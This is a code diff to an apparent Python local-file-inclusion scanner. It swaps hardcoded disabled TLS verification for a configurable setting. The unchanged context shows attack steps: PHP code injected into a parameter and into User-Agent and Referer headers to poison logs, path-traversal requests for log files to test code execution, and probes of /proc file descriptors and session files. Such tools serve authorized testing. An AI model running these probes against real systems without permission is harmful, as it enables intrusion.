@@ -5,6 +5,7 @@ import requests
 from tools.log_utils import get_logger
 from tools.http_client import build_url
 from tools.payload_engine import generate
+from tools.settings import settings
 
 logger = get_logger("lfi_scanner")
 
@@ -41,6 +42,7 @@ class LFIScanner:
     def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0,
                  waf_name: Optional[str] = None):
         self.sess = sess or requests.Session()
+        self.sess.verify = settings.verify_ssl
         self.timeout = timeout
         self.waf_name = waf_name
         self.findings = []
@@ -53,7 +55,7 @@ class LFIScanner:
             payload = entry["payload"]
             try:
                 r = self.sess.get(build_url(url, param, payload),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 for pat, label in EVIDENCE_PATTERNS:
                     if re.search(pat, r.text):
                         results.append({"payload": payload[:30], "label": label,
@@ -72,7 +74,7 @@ class LFIScanner:
             indicator = entry.get("indicator", "")
             try:
                 r = self.sess.get(build_url(url, param, payload),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 if wrapper_type == "base64":
                     if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', r.text):
                         results.append({"payload": payload[:35], "type": "base64", "size": len(r.text)})
@@ -99,13 +101,13 @@ class LFIScanner:
         poison_payload = "<?php %s ?>" % LFI_RCE_PAYLOAD
         try:
             self.sess.get(build_url(url, param, poison_payload),
-                          timeout=self.timeout, verify=False)
+                          timeout=self.timeout)
         except Exception as e:
             logger.debug("lfi poison injection: %s", e)
 
         headers_poison = {"User-Agent": poison_payload, "Referer": poison_payload}
         try:
-            self.sess.get(url, headers=headers_poison, timeout=self.timeout, verify=False)
+            self.sess.get(url, headers=headers_poison, timeout=self.timeout)
         except Exception as e:
             logger.debug("lfi header poison: %s", e)
 
@@ -113,7 +115,7 @@ class LFIScanner:
             try:
                 payload = "../../.." + log_path
                 r = self.sess.get(build_url(url, param, payload),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 if "LFI_TEST_SUCCESS" in r.text:
                     results.append({"type": "log_poison_rce", "path": log_path,
                                     "status": r.status_code})
@@ -129,7 +131,7 @@ class LFIScanner:
         for fd_path in PROC_FD_PATHS:
             try:
                 r = self.sess.get(build_url(url, param, fd_path),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 if len(r.text) > 50:
                     results.append({"fd": fd_path, "size": len(r.text),
                                     "status": r.status_code})
@@ -145,7 +147,7 @@ class LFIScanner:
             try:
                 payload = sess_path_tpl % sid
                 r = self.sess.get(build_url(url, param, payload),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 if len(r.text) > 20:
                     results.append({"session_path": payload, "size": len(r.text)})
             except Exception as e:
